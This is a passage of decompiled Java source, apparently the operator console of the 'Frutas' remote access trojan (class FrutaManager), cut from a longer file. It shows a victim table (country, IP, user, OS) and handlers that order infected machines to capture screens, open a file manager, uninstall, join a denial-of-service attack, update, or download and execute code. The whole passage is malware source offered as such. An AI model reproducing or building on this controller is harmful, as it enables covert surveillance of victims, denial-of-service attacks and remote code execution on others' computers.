/* 733 */     this.acerca.setText(rb.getString("barra2.acerca"));
/* 734 */     this.autor.setText(rb.getString("barra2.autor"));
/* 735 */     this.usuariosTotal.setTitle(rb.getString("framegeneral.nombre"));
/* 736 */     this.labelpuerto.setText(rb.getString("label.puerto"));
/* 737 */     this.labelpuerto2.setText(rb.getString("label.puerto2"));
/*     */ 
/* 740 */     if (this.botonListen.getText().equalsIgnoreCase(this.idiomaanterios.getString("boton.escucha.activado")))
/* 741 */       this.botonListen.setText(rb.getString("boton.escucha.activado"));
/*     */     else {
/* 743 */       this.botonListen.setText(rb.getString("boton.escucha.desactivado"));
/*     */     }
/*     */ 
/* 746 */     this.labelpass.setText(rb.getString("label.contrasena"));
/* 747 */     this.labelconectados.setText(rb.getString("label.conectado"));
/* 748 */     this.tabla.getColumnModel().getColumn(0).setHeaderValue(rb.getString("tabla.pais"));
/* 749 */     this.tabla.getColumnModel().getColumn(1).setHeaderValue(rb.getString("tabla.identificador"));
/* 750 */     this.tabla.getColumnModel().getColumn(2).setHeaderValue(rb.getString("tabla.externa"));
/* 751 */     this.tabla.getColumnModel().getColumn(3).setHeaderValue(rb.getString("tabla.interna"));
/* 752 */     this.tabla.getColumnModel().getColumn(4).setHeaderValue(rb.getString("tabla.user"));
/* 753 */     this.tabla.getColumnModel().getColumn(5).setHeaderValue(rb.getString("tabla.os"));
/* 754 */     this.tabla.getColumnModel().getColumn(6).setHeaderValue(rb.getString("tabla.jre"));
/* 755 */     this.tabla.getColumnModel().getColumn(7).setHeaderValue(rb.getString("tabla.version"));
/* 756 */     this.tabla.updateUI();
/*     */ 
/* 759 */     this.idiomaanterios = rb;
/*     */ 
/* 762 */     for (JInternalFrame i : this.jdeskTopPanel1.getAllFrames())
/*     */     {
/* 764 */       if ((i instanceof SoporteLenguaje))
/* 765 */         ((SoporteLenguaje)i).changeLenguage(rb);
/*     */     }
/*     */   }
/*     */ 
/*     */   private void capturaPantallaActionPerformed(ActionEvent evt)
/*     */   {
/* 777 */     if (this.tabla.getSelectedRows().length > 1) {
/* 778 */       JOptionPane.showMessageDialog(this, "Esta opcion no esta disponible paramultiple seleccion...");
/*     */ 
/* 780 */       return;
/*     */     }
/* 782 */     String seleccionado = this.tabla.getValueAt(this.tabla.getSelectedRow(), 1).toString();
/*     */ 
/* 784 */     Usuario tmp = (Usuario)Escucha.USUARIOS.get(seleccionado);
/* 785 */     tmp.sendComando(7);
/*     */   }
/*     */ 
/*     */   private void dosActionPerformed(ActionEvent evt)
/*     */   {
/* 798 */     int[] selec = this.tabla.getSelectedRows();
/* 799 */     Usuario[] user = new Usuario[selec.length];
/* 800 */     for (int i = 0; i < selec.length; i++) {
/* 801 */       String seleccionado = this.tabla.getValueAt(selec[i], 1).toString();
/* 802 */       user[i] = Escucha.listGet(seleccionado);
/*     */     }
/*     */ 
/* 807 */     Doos m = new Doos(user, this.idioma);
/* 808 */     m.setVisible(true);
/* 809 */     m.setLocation(100, 100);
/* 810 */     this.jdeskTopPanel1.add(m, 0);
/*     */   }
/*     */ 
/*     */   public void loadConfig()
/*     */   {
/* 816 */     Properties p = new Properties();
/*     */     try {
/* 818 */       p.loadFromXML(new FileInputStream("config.xml"));
/* 819 */       this.puerto.setValue(Integer.valueOf(Integer.parseInt(p.getProperty("puerto1"))));
/* 820 */       this.puerto2.setValue(Integer.valueOf(Integer.parseInt(p.getProperty("puerto2"))));
/*     */     } catch (Exception ex) {
/* 822 */       ex.printStackTrace();
/*     */     }
/*     */   }
/*     */ 
/*     */   private void saveConfigActionPerformed(ActionEvent evt)
/*     */   {
/* 828 */     Properties p = new Properties();
/* 829 */     p.setProperty("puerto1", this.puerto.getValue().toString());
/* 830 */     p.setProperty("puerto2", this.puerto2.getValue().toString());
/*     */     try {
/* 832 */       p.storeToXML(new FileOutputStream("config.xml"), "Configuracion de los puertos");
/* 833 */       JOptionPane.showMessageDialog(this.openport, "Puertos guardados correctamente");
/*     */     }
/*     */     catch (IOException ex)
/*     */     {
/*     */     }
/*     */   }
/*     */ 
/*     */   private void filemanagerActionPerformed(ActionEvent evt) {
/* 841 */     if (this.tabla.getSelectedRows().length > 1) {
/* 842 */       JOptionPane.showMessageDialog(this, "Esta opcion no esta disponible paramultiple seleccion...");
/*     */ 
/* 844 */       return;
/*     */     }
/* 846 */     String seleccionado = this.tabla.getValueAt(this.tabla.getSelectedRow(), 1).toString();
/*     */ 
/* 848 */     Usuario tmp = (Usuario)Escucha.USUARIOS.get(seleccionado);
/* 849 */     tmp.sendComando(9);
/*     */   }
/*     */ 
/*     */   private void desinstalaActionPerformed(ActionEvent evt)
/*     */   {
/* 859 */     if (this.tabla.getRowCount() == 0) {
/* 860 */       return;
/*     */     }
/*     */ 
/* 870 */     int[] selec = this.tabla.getSelectedRows();
/* 871 */     Usuario[] user = new Usuario[selec.length];
/* 872 */     for (int i = 0; i < selec.length; i++) {
/* 873 */       String seleccionado = this.tabla.getValueAt(selec[i], 1).toString();
/* 874 */       user[i] = Escucha.listGet(seleccionado);
/* 875 */       user[i].sendComando(10);
/*     */     }
/*     */   }
/*     */ 
/*     */   private void idiomasssActionPerformed(ActionEvent evt)
/*     */   {
/* 881 */     Idiomas mm = new Idiomas(this);
/* 882 */     mm.setLocation(100, 100);
/* 883 */     mm.setVisible(true);
/* 884 */     this.jdeskTopPanel1.add(mm, 0);
/*     */   }
/*     */ 
/*     */   private void openportActionPerformed(ActionEvent evt) {
/* 888 */     Herramientas ch = new Herramientas();
/*     */ 
/* 891 */     ch.setVisible(true);
/* 892 */     ch.setLocation(200, 200);
/* 893 */     this.jdeskTopPanel1.add(ch, 0);
/*     */   }
/*     */ 
/*     */   private void actualizaActionPerformed(ActionEvent evt)
/*     */   {
/* 900 */     int[] selec = this.tabla.getSelectedRows();
/* 901 */     System.out.println(selec.length);
/* 902 */     Usuario[] user = new Usuario[selec.length];
/* 903 */     for (int i = 0; i < selec.length; i++) {
/* 904 */       String seleccionado = this.tabla.getValueAt(selec[i], 1).toString();
/* 905 */       user[i] = Escucha.listGet(seleccionado);
/*     */     }
/*     */ 
/* 911 */     Actualiza m = new Actualiza(user, this.idioma);
/* 912 */     m.setVisible(true);
/* 913 */     m.setLocation(100, 100);
/* 914 */     this.jdeskTopPanel1.add(m, 0);
/*     */   }
/*     */ 
/*     */   private void downloadActionPerformed(ActionEvent evt) {
/* 918 */     int[] selec = this.tabla.getSelectedRows();
/* 919 */     System.out.println(selec.length);
/* 920 */     Usuario[] user = new Usuario[selec.length];
/* 921 */     for (int i = 0; i < selec.length; i++) {
/* 922 */       String seleccionado = this.tabla.getValueAt(selec[i], 1).toString();
/* 923 */       user[i] = Escucha.listGet(seleccionado);
/*     */     }
/*     */ 
/* 929 */     DescargaYEjecuta m = new DescargaYEjecuta(user, this.idioma);
/* 930 */     m.setVisible(true);
/* 931 */     m.setLocation(100, 100);
/* 932 */     this.jdeskTopPanel1.add(m, 0);
/*     */   }
/*     */ 
/*     */   public static void main(String[] args)
/*     */   {
/*     */     try
/*     */     {
/* 950 */       UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
/*     */ 
/* 952 */       UIManager.put("AuditoryCues.playList", UIManager.get("AuditoryCues.allAuditoryCues"));
/*     */     }
/*     */     catch (Exception e)
/*     */     {
/*     */     }
/*     */ 
/* 959 */     EventQueue.invokeLater(new Runnable()
/*     */     {
/*     */       public void run() {
/* 962 */         new FrutaManager().setVisible(true);
/*     */       }
/*     */     });
/*     */   }
/*     */ 
/*     */   static class celban extends DefaultTableCellRenderer
/*     */   {
/*     */     public void setValue(Object value)
/*     */     {
/* 989 */       if (value == null) {
/* 990 */         setText("N/A");
/*     */       }
/*     */       else
/*     */       {
/* 995 */         setIcon(new ImageIcon(getClass().getResource("/banderas/" + value.toString() + ".gif")));
/* 996 */         setText(value.toString());
/*     */       }
/*     */     }
/*     */   }
/*     */ }

/* Location:           C:\Users\Danilo\Desktop\Coisas\Frutas_RAT.jar
 * Qualified Name:     cliente.FrutaManager
 * JD-Core Version:    0.6.2
 */